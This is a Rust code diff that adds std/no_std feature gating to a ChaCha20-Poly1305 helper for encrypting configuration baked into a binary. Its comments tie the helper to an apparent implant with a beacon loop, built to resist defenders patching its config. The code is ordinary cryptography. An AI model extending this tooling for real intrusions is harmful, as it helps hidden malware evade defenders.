@@ -11,6 +11,19 @@
 //! Why AEAD (not bare stream): config-in-binary is integrity-sensitive (a
 //! defender patching the embedded config should fail the Poly1305 tag), so we
 //! reuse the same ChaCha20-Poly1305 the beacon loop already trusts.
+//!
+//! ## Features
+//! - `std` (default): enables [`encrypt`] (needs `rand`/`OsRng`). Used by the
+//!   proc-macro at build time and by tests.
+//! - `no_std`: drops [`encrypt`] and the `rand` dep, leaving only [`decrypt`]
+//!   (needs just `chacha20poly1305` + `alloc`). Used by the `#![no_std]` PIC
+//!   implant, which only ever decrypts a config baked at build time.
+
+#![cfg_attr(feature = "no_std", no_std)]
+
+extern crate alloc;
+
+use alloc::vec::Vec;
 
 use chacha20poly1305::{
     aead::{Aead, Payload},
@@ -22,7 +35,8 @@ pub const NONCE_LEN: usize = 12;
 
 /// Encrypt `plain` under a freshly generated key+nonce. Returns
 /// `(key, nonce, ciphertext_with_tag)`. Used by the proc-macro at compile time
-/// (and by tests).
+/// (and by tests). Requires the `std` feature (OsRNG via `getrandom`).
+#[cfg(feature = "std")]
 pub fn encrypt(plain: &[u8]) -> ([u8; KEY_LEN], [u8; NONCE_LEN], Vec<u8>) {
     use rand::RngCore;
     let mut key = [0u8; KEY_LEN];
@@ -38,7 +52,8 @@ pub fn encrypt(plain: &[u8]) -> ([u8; KEY_LEN], [u8; NONCE_LEN], Vec<u8>) {
 
 /// Decrypt config baked by [`encrypt`] / `embed!`. Panics on tag mismatch —
 /// in practice all material is baked at compile time, so a failure means
-/// tampering and the implant should treat it as fatal.
+/// tampering and the implant should treat it as fatal. Available in both the
+/// `std` and `no_std` feature builds.
 pub fn decrypt(key: &[u8; KEY_LEN], nonce: &[u8; NONCE_LEN], ciphertext: &[u8]) -> Vec<u8> {
     let cipher = ChaCha20Poly1305::new(chacha20poly1305::Key::from_slice(key));
     cipher
